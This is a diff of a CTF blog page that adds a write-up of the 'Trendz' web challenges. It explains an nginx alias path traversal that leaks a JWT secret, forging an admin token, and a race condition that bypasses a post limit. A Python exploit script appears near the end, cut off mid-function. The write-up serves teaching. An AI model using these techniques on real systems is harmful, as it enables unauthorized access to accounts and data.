@@ -5,7 +5,7 @@
     <meta charset="utf-8">
     <link rel="shortcut icon" href='http://localhost:1313/favicon.ico' type="image/x-icon">
     <meta name="viewport" content="width=device-width, initial-scale=1">
-    <title> - ByteTheCookies</title>
+    <title>Trendz - ByteTheCookies</title>
 
     
 
@@ -18,37 +18,27 @@
     
         <meta property="og:url" content="http://localhost:1313/writeups/cyberspace2024/trendz/">
   <meta property="og:site_name" content="ByteTheCookies">
-  <meta property="og:title" content="ByteTheCookies">
-  <meta property="og:description" content="Trendz Description: …
-Introduction …
-Source …
-# filename: file.py …
-Solution …
-# filename: file.py $ flag: flag{redacted} Author: ... ">
+  <meta property="og:title" content="Trendz">
+  <meta property="og:description" content="Trendz (part 1 &amp; 2) Preamble This challenge is divided into four parts, three webs and a reverse. I’m excited to share that I managed to solve the first two webs! I’ll insert them all in a write-up, trying to explain them in the way the author thought. I admit I did not solve them in order, but I’m eager to see how they fit together. The application was written in Go using templates and a JWT authentication, and it’s write well!">
   <meta property="og:locale" content="en">
   <meta property="og:type" content="article">
     <meta property="article:section" content="writeups">
     <meta property="article:published_time" content="2024-09-02T10:59:04+02:00">
     <meta property="article:modified_time" content="2024-09-02T11:17:58+02:00">
-    <meta property="article:tag" content="Category">
-    <meta property="article:tag" content="Language">
-    <meta property="article:tag" content="Attack Type">
-    <meta property="article:tag" content="N Points">
-    <meta property="article:tag" content="N Solves">
-    <meta property="article:tag" content="Authors">
+    <meta property="article:tag" content="Web">
+    <meta property="article:tag" content="Jwt Secret Leak">
+    <meta property="article:tag" content="Race Condition">
+    <meta property="article:tag" content="383 Points">
+    <meta property="article:tag" content="175 Points">
+    <meta property="article:tag" content="52 Solves">
 
     
 
     
         
   <meta name="twitter:card" content="summary">
-  <meta name="twitter:title" content="ByteTheCookies">
-  <meta name="twitter:description" content="Trendz Description: …
-Introduction …
-Source …
-# filename: file.py …
-Solution …
-# filename: file.py $ flag: flag{redacted} Author: ... ">
+  <meta name="twitter:title" content="Trendz">
+  <meta name="twitter:description" content="Trendz (part 1 &amp; 2) Preamble This challenge is divided into four parts, three webs and a reverse. I’m excited to share that I managed to solve the first two webs! I’ll insert them all in a write-up, trying to explain them in the way the author thought. I admit I did not solve them in order, but I’m eager to see how they fit together. The application was written in Go using templates and a JWT authentication, and it’s write well!">
 
     <link rel="stylesheet" href="/style.css" integrity="">
 
@@ -236,9 +226,28 @@ Solution …
         
             <nav id="TableOfContents">
   <ul>
+    <li><a href="#preamble">Preamble</a></li>
+    <li><a href="#application-flow">Application flow</a></li>
+    <li><a href="#path-structure">Path structure</a></li>
+    <li><a href="#config-files">Config files</a></li>
+  </ul>
+
+  <ul>
     <li><a href="#introduction">Introduction</a></li>
     <li><a href="#source">Source</a></li>
     <li><a href="#solution">Solution</a></li>
+    <li><a href="#solution-1">Solution</a></li>
+  </ul>
+
+  <ul>
+    <li><a href="#introduction-1">Introduction</a></li>
+    <li><a href="#source-1">Source</a></li>
+    <li><a href="#solution-2">Solution</a></li>
+    <li><a href="#final-script">Final script</a>
+      <ul>
+        <li></li>
+      </ul>
+    </li>
   </ul>
 </nav>
         
@@ -248,22 +257,28 @@ Solution …
 
 <div class="tags">
   
-    <div class="badge">category</div>
+    <div class="badge">Web</div>
 
   
-    <div class="badge">language</div>
+    <div class="badge">Jwt secret leak</div>
 
   
-    <div class="badge">attack type</div>
+    <div class="badge">Race condition</div>
 
   
-    <div class="badge">n points</div>
+    <div class="badge">383 points</div>
 
   
-    <div class="badge">n solves</div>
+    <div class="badge">175 points</div>
 
   
-    <div class="badge">authors</div>
+    <div class="badge">52 solves</div>
+
+  
+    <div class="badge">86 solves</div>
+
+  
+    <div class="badge">careless_finch</div>
 
   
 </div>
@@ -285,8 +300,228 @@ Solution …
         
         
     
-    <h1 style='text-decoration: underline;text-decoration-color: #9e8c6c;font-size: 3em;'>Trendz</h1>
-<p><strong>Description</strong>: &hellip;</p>
+    <h1 style='text-decoration: underline;text-decoration-color: #9e8c6c;font-size: 3em;'>Trendz (part 1 & 2)</h1>
+
+<h2 id="preamble" class="header-anchor-wrapper">Preamble
+  <a href="#preamble" class="header-anchor-link">
+    <svg width="16px" height="16px" viewBox="0 0 24 24">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="24" height="24" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <line x1="4" y1="9" x2="20" y2="9"></line><line x1="4" y1="15" x2="20" y2="15"></line><line x1="10" y1="3" x2="8" y2="21"></line><line x1="16" y1="3" x2="14" y2="21"></line>
+</svg>
+
+</svg>
+  </a>
+</h2>
+
+<p>This challenge is divided into four parts, three webs and a reverse. I&rsquo;m excited to share that I managed to solve the first two webs! I&rsquo;ll insert them all in a write-up, trying to explain them in the way the author thought. I admit I did not solve them in order, but I&rsquo;m eager to see how they fit together.
+The application was written in Go using templates and a JWT authentication, and it&rsquo;s write well! The application itself has many files, but they are well written and ordered, so a thorough analysis is not difficult but necessary. The application is divided into 5 basic parts.</p>
+<ul>
+<li><strong>Config file</strong>: <code>ngix.conf</code> ,<code>run.sh</code>,<code>init.sql</code>, <code>dockerfile</code> and <code>.dockerignore</code></li>
+<li><strong>Main go file</strong>: <code>main.go</code> This is where you&rsquo;ll find all the details about how to use the different functions and what they do!</li>
+<li><strong>Dashboard</strong>: Here are the 3 types of dashboards possible in the application</li>
+<li><strong>Jwt handler</strong>: How to use JWT for authentication.</li>
+<li><strong>Service</strong>: The various services such as post creation or user validation</li>
+</ul>
+
+<h2 id="application-flow" class="header-anchor-wrapper">Application flow
+  <a href="#application-flow" class="header-anchor-link">
+    <svg width="16px" height="16px" viewBox="0 0 24 24">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="24" height="24" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <line x1="4" y1="9" x2="20" y2="9"></line><line x1="4" y1="15" x2="20" y2="15"></line><line x1="10" y1="3" x2="8" y2="21"></line><line x1="16" y1="3" x2="14" y2="21"></line>
+</svg>
+
+</svg>
+  </a>
+</h2>
+
+<p>The basic application is presented with a login/registration screen where once we are logged in we are assigned an accesstoken and a refreshtoken, a redirect to the standard user dashboard occurs where we can create posts and view them via <code>/posts/post-id</code>,basically more than this we cannot do</p>
+<p><img alt="alt text" src="/images/trendz/image.png">
+<img alt="alt text" src="/images/trendz/image-1.png"></p>
+
+<h2 id="path-structure" class="header-anchor-wrapper">Path structure
+  <a href="#path-structure" class="header-anchor-link">
+    <svg width="16px" height="16px" viewBox="0 0 24 24">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="24" height="24" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <line x1="4" y1="9" x2="20" y2="9"></line><line x1="4" y1="15" x2="20" y2="15"></line><line x1="10" y1="3" x2="8" y2="21"></line><line x1="16" y1="3" x2="14" y2="21"></line>
+</svg>
+
+</svg>
+  </a>
+</h2>
+
+<p>As mentioned before in the main.go we find the path declaration and some very important initialization functions</p>
+<pre  class="mc-prism hide language-text" ><code class="language-go">// filename: main.go
+
+func main() {
+ s := gin.Default()
+ s.LoadHTMLGlob(&quot;templates/*&quot;)
+ db.InitDBconn()
+ jwt.InitJWT() // Initialization of jwt we will analyze it later
+
+ s.GET(&quot;/&quot;, func(c *gin.Context) {
+  c.Redirect(302, &quot;/login&quot;)
+ })
+ s.GET(&quot;/ping&quot;, func(c *gin.Context) {
+  c.JSON(200, gin.H{
+   &quot;message&quot;: &quot;pong&quot;,
+  })
+ })
+ r := s.Group(&quot;/&quot;)
+ r.POST(&quot;/register&quot;, service.CreateUser)
+ r.GET(&quot;/register&quot;, func(c *gin.Context) {
+  c.HTML(200, &quot;register.tmpl&quot;, gin.H{})
+ })
+ r.POST(&quot;/login&quot;, service.LoginUser)
+ r.GET(&quot;/login&quot;, func(c *gin.Context) {
+  c.HTML(200, &quot;login.tmpl&quot;, gin.H{})
+ })
+
+ r.GET(&quot;/getAccessToken&quot;, service.GenerateAccessToken)
+
+ authorizedEndpoints := r.Group(&quot;/user&quot;)
+ authorizedEndpoints.Use(service.AuthorizeAccessToken())
+ authorizedEndpoints.GET(&quot;/dashboard&quot;, dashboard.UserDashboard)
+ authorizedEndpoints.POST(&quot;/posts/create&quot;, service.CreatePost)
+ authorizedEndpoints.GET(&quot;/posts/:postid&quot;, service.ShowPost)
+ authorizedEndpoints.GET(&quot;/flag&quot;, service.DisplayFlag)
+
+ adminEndpoints := r.Group(&quot;/admin&quot;)
+ adminEndpoints.Use(service.AuthorizeAccessToken())
+ adminEndpoints.Use(service.ValidateAdmin())
+ adminEndpoints.GET(&quot;/dashboard&quot;, dashboard.AdminDashboard)
+
+ SAEndpoints := r.Group(&quot;/superadmin&quot;)
+ SAEndpoints.Use(service.AuthorizeAccessToken())
+ SAEndpoints.Use(service.ValidateAdmin())
+ SAEndpoints.Use(service.AuthorizeRefreshToken())
+ SAEndpoints.Use(service.ValidateSuperAdmin())
+ SAEndpoints.GET(&quot;/viewpost/:postid&quot;, dashboard.ViewPosts)
+ SAEndpoints.GET(&quot;/dashboard&quot;, dashboard.SuperAdminDashboard)
+ s.NoRoute(custom.Custom404Handler)
+ s.Run(&quot;:8000&quot;)
+}
+
+</code></pre>
+<p>As it is seen the scheme of the paths is very clear and it is well done basically we have the login and registration and then we move to a division by <code>role</code> where we have a user section an admin and a superadmin each of them with their own validation services</p>
+
+<h2 id="config-files" class="header-anchor-wrapper">Config files
+  <a href="#config-files" class="header-anchor-link">
+    <svg width="16px" height="16px" viewBox="0 0 24 24">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="24" height="24" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <line x1="4" y1="9" x2="20" y2="9"></line><line x1="4" y1="15" x2="20" y2="15"></line><line x1="10" y1="3" x2="8" y2="21"></line><line x1="16" y1="3" x2="14" y2="21"></line>
+</svg>
+
+</svg>
+  </a>
+</h2>
+
+<pre  class="mc-prism hide language-text" ><code class="language-bash"># filename: run.sh
+
+#!/bin/env sh
+cat /dev/urandom | head | sha1sum | cut -d &quot; &quot; -f 1 &gt; /app/jwt.secret
+
+export JWT_SECRET_KEY=notsosecurekey
+export ADMIN_FLAG=CSCTF{flag1}
+export POST_FLAG=CSCTF{flag2}
+export SUPERADMIN_FLAG=CSCTF{flag3}
+export REV_FLAG=CSCTF{flag4}
+export POSTGRES_USER=postgres
+export POSTGRES_PASSWORD=mysecretpassword
+export POSTGRES_DB=devdb
+
+uuid=$(cat /proc/sys/kernel/random/uuid)
+user=$(cat /dev/urandom | head | md5sum | cut -d &quot; &quot; -f 1)
+cat &lt;&lt; EOF &gt;&gt; /docker-entrypoint-initdb.d/init.sql
+ INSERT INTO users (username, password, role) VALUES ('superadmin', 'superadmin', 'superadmin');
+    INSERT INTO posts (postid, username, title, data) VALUES ('$uuid', '$user', 'Welcome to the CTF!', '$ADMIN_FLAG');
+EOF
+
+docker-ensure-initdb.sh &amp;
+GIN_MODE=release /app/chall &amp; sleep 5
+su postgres -c &quot;postgres -D /var/lib/postgresql/data&quot; &amp;
+
+nginx -g 'daemon off;'
+
+</code></pre>
+<p>This file is actually very important because it gives us an idea of where the flags are (which fortunately are also numbered)</p>
+<p>As we see the first thing that is done is to create a file called jwt.secret that will be a source of interest later,</p>
+<p>We see that another jwt secret is initialized and 4 flags in 4 different environment variables,</p>
+<p>Queries are made one in which the superadmin user is created and another in which the flag is inserted in a record in the posts table</p>
+<p>Finally, the postgree database and the ngix server are started.</p>
+<pre  class="mc-prism hide language-text" ><code class="language-json">
+user  nobody;
+worker_processes  auto;
+
+events {
+    worker_connections  1024;
+}
+
+
+http {
+    include       mime.types;
+    default_type  application/octet-stream;
+
+    sendfile        on;
+    keepalive_timeout  65;
+
+    server {
+        listen       80;
+        server_name  localhost;
+        location / {
+            proxy_pass http://localhost:8000;
+        }
+        location /static {
+            alias /app/static/;
+        }
+        error_page   500 502 503 504  /50x.html;
+        location = /50x.html {
+            root   html;
+        }
+
+    }
+
+}
+
+</code></pre>
+<p>This is the ngix configuration, where a fairly standard configuration is written, except for declaring a <code>/static</code> alias.</p>
+<p>Well, once I&rsquo;ve finished presenting the application, I&rsquo;d say you&rsquo;re ready to go&hellip;</p>
+<hr>
+
+<h1 id="trendz-part-1" class="header-anchor-wrapper">Trendz Part 1
+  <a href="#trendz-part-1" class="header-anchor-link">
+    <svg width="16px" height="16px" viewBox="0 0 24 24">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="24" height="24" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <line x1="4" y1="9" x2="20" y2="9"></line><line x1="4" y1="15" x2="20" y2="15"></line><line x1="10" y1="3" x2="8" y2="21"></line><line x1="16" y1="3" x2="14" y2="21"></line>
+</svg>
+
+</svg>
+  </a>
+</h1>
+
+<p><strong>Description</strong>: The latest trendz is all about Go and HTMX, but what could possibly go wrong? A secret post has been hidden deep within the application. Your mission is to uncover it.</p>
+<blockquote>
+<p>Note: This challenge consists of four parts, which can be solved in any order. However, the final part will only be accessible once you&rsquo;ve completed this initial task, and will be released in Wave 3.</p>
+</blockquote>
 
 <h2 id="introduction" class="header-anchor-wrapper">Introduction
   <a href="#introduction" class="header-anchor-link">
@@ -303,7 +538,7 @@ Solution …
   </a>
 </h2>
 
-<p>&hellip;</p>
+<p>Well, as we saw in the run.sh file, the first flag is inside a record in the post table and it is also called ADMIN_FLAG, so the first thing to see is how admin authentication works and what the admin dashboard can do.</p>
 
 <h2 id="source" class="header-anchor-wrapper">Source
   <a href="#source" class="header-anchor-link">
@@ -320,13 +555,121 @@ Solution …
   </a>
 </h2>
 
-<p>&hellip;</p>
-<pre  class="mc-prism hide language-text" ><code class="language-python"># filename: file.py
+<pre  class="mc-prism hide language-text" ><code class="language-go">// filename: AdminDash.go
 
+package dashboard
 
+import (
+ &quot;app/handlers/service&quot;
+ &quot;os&quot;
 
+ &quot;github.com/gin-gonic/gin&quot;
+)
+
+func AdminDashboard(ctx *gin.Context) {
+ posts := service.GetAllPosts()
+ ctx.HTML(200, &quot;adminDash.tmpl&quot;, gin.H{
+  &quot;flag&quot;:  os.Getenv(&quot;ADMIN_FLAG&quot;),
+  &quot;posts&quot;: posts,
+ })
+}
 </code></pre>
-<p>&hellip;</p>
+<p>As we can see, the dashboard is very concise, we simply see that the <code>GetAllPosts()</code> function is called and then they are sent to the template, so not much to do here, let&rsquo;s move on to how the admin is authenticated.</p>
+<pre  class="mc-prism hide language-text" ><code class="language-go">//filename: main.go
+
+adminEndpoints := r.Group(&quot;/admin&quot;)
+adminEndpoints.Use(service.AuthorizeAccessToken())
+adminEndpoints.Use(service.ValidateAdmin())
+adminEndpoints.GET(&quot;/dashboard&quot;, dashboard.AdminDashboard)
+</code></pre>
+<p>As we can see from the code, whenever we try to connect to the admin dashboard, it first runs two functions, <code>ValidateAccess()</code> and <code>ValidateAdmin()</code>.</p>
+<pre  class="mc-prism hide language-text" ><code class="language-go">//filename: JWTHandler.go
+
+func AuthorizeAccessToken() gin.HandlerFunc {
+ return func(c *gin.Context) {
+  c.Header(&quot;X-Frame-Options&quot;, &quot;DENY&quot;)
+  c.Header(&quot;X-XSS-Protection&quot;, &quot;1; mode=block&quot;)
+  const bearerSchema = &quot;Bearer &quot;
+  var tokenDetected bool = false
+  var tokenString string
+  authHeader := c.GetHeader(&quot;Authorization&quot;)
+  if len(authHeader) != 0 {
+   tokenDetected = true
+   tokenString = authHeader[len(bearerSchema):]
+  }
+  if !tokenDetected {
+   var err error
+   tokenString, err = c.Cookie(&quot;accesstoken&quot;)
+   if tokenString == &quot;&quot; || err != nil {
+    c.Redirect(302, &quot;/getAccessToken?redirect=&quot;+c.Request.URL.Path)
+   }
+  }
+  fmt.Println(tokenString)
+  token, err := jwt.ValidateAccessToken(tokenString)
+  if err != nil {
+   fmt.Println(err)
+   c.AbortWithStatus(403)
+  }
+  if token.Valid {
+   claims := jwt.GetClaims(token)
+   fmt.Println(claims)
+   c.Set(&quot;username&quot;, claims[&quot;username&quot;])
+   c.Set(&quot;role&quot;, claims[&quot;role&quot;])
+  } else {
+   fmt.Println(&quot;Token is not valid&quot;)
+   c.Header(&quot;HX-Redirect&quot;, &quot;/getAccessToken&quot;)
+   c.AbortWithStatus(403)
+  }
+ }
+}
+</code></pre>
+<p>This is a pretty standard function regarding JWT integrity checking, in fact here we see that the function checks that the cookie is well formatted and has no problems by validating it with the <code>ValidateAccessToken()</code> function, otherwise it rejects it or aborts the operation.</p>
+<pre  class="mc-prism hide language-text" ><code class="language-go">//filename: JWTAuth.go
+
+func ValidateAccessToken(encodedToken string) (*jwt.Token, error) {
+ return jwt.Parse(encodedToken, func(token *jwt.Token) (interface{}, error) {
+  _, isValid := token.Method.(*jwt.SigningMethodHMAC)
+  if !isValid {
+   return nil, fmt.Errorf(&quot;invalid token with signing method: %v&quot;, token.Header[&quot;alg&quot;])
+  }
+  return []byte(secretKey), nil
+ })
+}
+
+// The function is safe and it is not subject to `alg:none` or any other kind of attack, so we must move on.
+</code></pre>
+<pre  class="mc-prism hide language-text" ><code class="language-go">//filename: ValidateAdmin.go
+
+func ValidateAdmin() gin.HandlerFunc {
+ return func(c *gin.Context) {
+  const bearerSchema = &quot;Bearer &quot;
+  var tokenDetected bool = false
+  var tokenString string
+  authHeader := c.GetHeader(&quot;Authorization&quot;)
+  if len(authHeader) != 0 {
+   tokenDetected = true
+   tokenString = authHeader[len(bearerSchema):]
+  }
+  if !tokenDetected {
+   var err error
+   tokenString, err = c.Cookie(&quot;accesstoken&quot;)
+   if tokenString == &quot;&quot; || err != nil {
+    c.Redirect(302, &quot;/getAccessToken?redirect=&quot;+c.Request.URL.Path)
+   }
+  }
+  fmt.Println(tokenString)
+  claims := jwt.ExtractClaims(tokenString)
+  if claims[&quot;role&quot;] == &quot;admin&quot; || claims[&quot;role&quot;] == &quot;superadmin&quot; {
+   fmt.Println(claims)
+  } else {
+   fmt.Println(&quot;Token is not valid&quot;)
+   c.AbortWithStatusJSON(403, gin.H{&quot;error&quot;: &quot;User Unauthorized&quot;})
+   return
+  }
+ }
+}
+</code></pre>
+<p>Instead, we see here that the role is validated in the JWT by checking that it is at least admin or superadmin.</p>
 
 <h2 id="solution" class="header-anchor-wrapper">Solution
   <a href="#solution" class="header-anchor-link">
@@ -343,15 +686,330 @@ Solution …
   </a>
 </h2>
 
-<p>&hellip;</p>
-<pre  class="mc-prism hide language-text" ><code class="language-python"># filename: file.py
+<p>Mmm authentication seems secure let&rsquo;s take a step back and go to the JWTInit function.</p>
+<pre  class="mc-prism hide language-text" ><code class="language-go">//filename: JWTAuth.go
 
+func InitJWT() {
+ key, err := os.ReadFile(&quot;jwt.secret&quot;)
+ if err != nil {
+  panic(err)
+ }
+ secretKey = key[:]
+ fmt.Printf(&quot;JWT initialized %v\n&quot;, secretKey)
+}
+</code></pre>
+<p>We see that the function itself doesn&rsquo;t do much simply takes the key with which it will sign jwt&rsquo;s from a file well known to us in fact we have seen it in run.sh where it is created and where a secure value is put there</p>
 
+<h2 id="solution-1" class="header-anchor-wrapper">Solution
+  <a href="#solution-1" class="header-anchor-link">
+    <svg width="16px" height="16px" viewBox="0 0 24 24">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="24" height="24" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <line x1="4" y1="9" x2="20" y2="9"></line><line x1="4" y1="15" x2="20" y2="15"></line><line x1="10" y1="3" x2="8" y2="21"></line><line x1="16" y1="3" x2="14" y2="21"></line>
+</svg>
+
+</svg>
+  </a>
+</h2>
+
+<p>But if we analyse the Docker file system locally, we see that jwt.secret is located in the same folder as static, which we saw in the ngix configuration create an alias to that path.</p>
+<pre  class="mc-prism hide language-text" ><code class="language-json">location /static {
+            alias /app/static/;
+        }
+</code></pre>
+<p>If we try to access /static we can see.</p>
+<p><img alt="alt text" src="/images/trendz/image-2.png"></p>
+<p>NOTHING&hellip; But we can wander around a bit for js and css files that we don&rsquo;t need though, And if we try a class ../ after static we see that it doesn&rsquo;t find anything there</p>
+<p>Hmm will there be a way to bypass the ngix and access the file?</p>
+<p>Well actually yes because the configuration as we see on <a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/nginx#alias-lfi-misconfiguration">hacktricks</a> is insecure and easily bypassed like this</p>
+<p><img alt="alt text" src="/images/trendz/image-3.png"></p>
+<p>And if we try to type <code>/static../jwt.secret</code>&hellip; NICE WE GOT THE JWT SECRET</p>
+<p>Now just change the role of the jwt and re-sign it but we&rsquo;ll see that later in detail being that the challenge itself is solved&hellip; <strong>(At the end see the #PS)</strong></p>
+
+<h1 id="trendz-part-2" class="header-anchor-wrapper">Trendz Part 2
+  <a href="#trendz-part-2" class="header-anchor-link">
+    <svg width="16px" height="16px" viewBox="0 0 24 24">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="24" height="24" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <line x1="4" y1="9" x2="20" y2="9"></line><line x1="4" y1="15" x2="20" y2="15"></line><line x1="10" y1="3" x2="8" y2="21"></line><line x1="16" y1="3" x2="14" y2="21"></line>
+</svg>
+
+</svg>
+  </a>
+</h1>
+
+<p><strong>Descripion</strong>: Staying active has its rewards. There&rsquo;s a special gift waiting for you, but it&rsquo;s only available once you&rsquo;ve made more than 12 posts. Keep posting to uncover the surprise!</p>
+<blockquote>
+<p>Note: Use the instancer and source from part one of this challenge, Trendz.</p>
+</blockquote>
+
+<h2 id="introduction-1" class="header-anchor-wrapper">Introduction
+  <a href="#introduction-1" class="header-anchor-link">
+    <svg width="16px" height="16px" viewBox="0 0 24 24">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="24" height="24" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <line x1="4" y1="9" x2="20" y2="9"></line><line x1="4" y1="15" x2="20" y2="15"></line><line x1="10" y1="3" x2="8" y2="21"></line><line x1="16" y1="3" x2="14" y2="21"></line>
+</svg>
+
+</svg>
+  </a>
+</h2>
+
+<p>We are in the second part of the Trendz challenge, so we have exactly the same application, only the target flag has changed.</p>
+
+<h2 id="source-1" class="header-anchor-wrapper">Source
+  <a href="#source-1" class="header-anchor-link">
+    <svg width="16px" height="16px" viewBox="0 0 24 24">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="24" height="24" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <line x1="4" y1="9" x2="20" y2="9"></line><line x1="4" y1="15" x2="20" y2="15"></line><line x1="10" y1="3" x2="8" y2="21"></line><line x1="16" y1="3" x2="14" y2="21"></line>
+</svg>
+
+</svg>
+  </a>
+</h2>
+
+<p>First thing to figure out is where the flag is located, going back to the run.sh we see that the file is located inside the <code>POST_FLAG</code> environment variable so we presso let&rsquo;s assume that the posts center something, searching the directories with grep or something else we see that the variable is called here:</p>
+<pre  class="mc-prism hide language-text" ><code class="language-go">//filename: Posts.go
+
+func DisplayFlag(ctx *gin.Context) {
+ username := ctx.MustGet(&quot;username&quot;).(string)
+ noOfPosts := CheckNoOfPosts(username)
+ if noOfPosts &lt;= 12 {
+
+  ctx.JSON(200, gin.H{&quot;error&quot;: fmt.Sprintf(&quot;You need %d more posts to view the flag&quot;, 12-noOfPosts)})
+  return
+ }
+ ctx.JSON(200, gin.H{&quot;flag&quot;: os.Getenv(&quot;POST_FLAG&quot;)})
+}
 
 </code></pre>
-<pre  class="mc-prism hide language-text" ><code class="language-stdout">$ flag: flag{redacted}
+<p>Oh we just need to make 12 simple posts no?</p>
+<p>Well not really in fact if we see the function that creates the posts we can see that it doesn&rsquo;t allow us to make more than 12</p>
+<pre  class="mc-prism hide language-text" ><code class="language-go">//filename: Posts.go
+
+func CreatePost(ctx *gin.Context) {
+ username := ctx.MustGet(&quot;username&quot;).(string)
+ noOfPosts := CheckNoOfPosts(username)
+ var req struct {
+  Title string `json:&quot;title&quot;`
+  Data  string `json:&quot;data&quot;`
+ }
+ if err := ctx.BindJSON(&amp;req); err != nil {
+  ctx.JSON(400, gin.H{&quot;error&quot;: &quot;Invalid request&quot;})
+  fmt.Println(err)
+  return
+ }
+ if noOfPosts &gt;= 10 {
+  ctx.JSON(200, gin.H{&quot;error&quot;: &quot;You have reached the maximum number of posts&quot;})
+  return
+ }
+ if len(req.Data) &gt; 210 {
+  ctx.JSON(200, gin.H{&quot;error&quot;: &quot;Data length should be less than 210 characters&quot;})
+  return
+ }
+ postID := InsertPost(username, req.Title, req.Data)
+ ctx.JSON(200, gin.H{&quot;postid&quot;: postID})
+}
+
 </code></pre>
-<p align='right'>Author: ... </p>
+<p>As we can see, a function is executed that checks the number of posts, which in itself is not a major problem, the problem lies in the misuse of this function.</p>
+<p>This is because although go is very fast and even postgree actually this doesn&rsquo;t stop us from making a race condition</p>
+
+<h2 id="solution-2" class="header-anchor-wrapper">Solution
+  <a href="#solution-2" class="header-anchor-link">
+    <svg width="16px" height="16px" viewBox="0 0 24 24">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="24" height="24" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <line x1="4" y1="9" x2="20" y2="9"></line><line x1="4" y1="15" x2="20" y2="15"></line><line x1="10" y1="3" x2="8" y2="21"></line><line x1="16" y1="3" x2="14" y2="21"></line>
+</svg>
+
+</svg>
+  </a>
+</h2>
+
+<p>The solution itself is very simple just create a large amount of requests simultaneously with the same session and hope to enter more posts than allowed by doing so we will be able to bypass the control and get our flag</p>
+<blockquote>
+<p>Probably the reason it works is much more precise and technical, but to tell you the truth, it came to me as soon as I saw it and tried it, and apparently my hunch was right&hellip;</p>
+</blockquote>
+
+<h2 id="final-script" class="header-anchor-wrapper">Final script
+  <a href="#final-script" class="header-anchor-link">
+    <svg width="16px" height="16px" viewBox="0 0 24 24">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="24" height="24" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <line x1="4" y1="9" x2="20" y2="9"></line><line x1="4" y1="15" x2="20" y2="15"></line><line x1="10" y1="3" x2="8" y2="21"></line><line x1="16" y1="3" x2="14" y2="21"></line>
+</svg>
+
+</svg>
+  </a>
+</h2>
+
+<p>This is the final exploit script with the 2 challenge solution</p>
+<pre  class="mc-prism hide language-text" ><code class="language-python"># filename: exploit.py
+#!/usr/bin/python3
+
+from concurrent.futures import ThreadPoolExecutor, as_completed
+from bs4 import BeautifulSoup
+import requests
+import jwt
+import string
+import random
+
+BASE_URL = &quot;https://ID-INSTANCE.bugg.cc/&quot;
+
+s = requests.Session()
+
+def random_string(length):
+    return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(length))
+
+
+def login(username, password):
+    response = s.post(f&quot;{BASE_URL}/login&quot;,
+                      json={&quot;username&quot;: username, &quot;password&quot;: password})
+    if response.status_code != 200:
+        print(f&quot;Login failed: {response.status_code}&quot;)
+        exit(response.status_code)
+
+
+def register(username, password):
+    response = s.post(f&quot;{BASE_URL}/register&quot;,
+                      json={&quot;username&quot;: username, &quot;password&quot;: password})
+    if response.status_code != 200:
+        print(f&quot;Register failed: {response.status_code}&quot;)
+        exit(response.status_code)
+
+def logout():
+    s.cookies.clear()
+
+def create_post(title: str = &quot;title&quot;, content: str = &quot;content&quot;):
+    response = s.post(f&quot;{BASE_URL}/user/posts/create&quot;,
+                      json={&quot;title&quot;: title, &quot;data&quot;: content})
+    if response.status_code != 200:
+        print(f&quot;Post creation failed: {response.status_code}&quot;)
+        exit(response.status_code)
+
+
+def run_tasks(num_tasks, concurrency_limit):
+    results = []
+    with ThreadPoolExecutor(max_workers=concurrency_limit) as executor:
+        futures = [executor.submit(create_post)
+                   for _ in range(num_tasks)]
+        for future in as_completed(futures):
+            results.append(future.result())
+
+    return results
+
+def download_secret():
+  r = s.get(f&quot;{BASE_URL}/static../jwt.secret&quot;, stream=True)
+  with open(&quot;jwt.secret&quot;, &quot;wb&quot;) as f:
+      for chunk in r.iter_content(chunk_size=1024):
+        f.write(chunk)
+
+def resign_jwt(claims, secret_key):
+    return jwt.encode(claims, secret_key, algorithm='HS256')
+
+def get_flag_2():
+    for _ in range(10):
+        print(&quot;Try: &quot; + str(_),end=&quot;\r&quot;)
+        run_tasks(num_tasks=50,concurrency_limit=100)
+        response = s.get(f&quot;{BASE_URL}/user/flag&quot;)
+        if &quot;CSCTF{&quot; in response.text:
+            print(&quot;Flag 2 trendzz: &quot; + response.json()['flag'])
+            return True
+        else:
+            logout()
+            username, password = random_string(10), random_string(10)
+            register(username, password)
+            login(username, password)
+    return False
+
+def get_flag_1():
+    download_secret()
+
+    with open(&quot;./jwt.secret&quot;, &quot;rb&quot;) as file:
+        key = file.read()
+
+    print(f&quot;Jwt secret leaked: {key}&quot;)
+
+    original_token = s.cookies.get_dict().get(&quot;accesstoken&quot;)
+
+    decoded_claims = jwt.decode(original_token, key, algorithms=['HS256'])
+
+    decoded_claims['role'] = 'admin'
+
+    new_jwt = resign_jwt(decoded_claims, key)
+
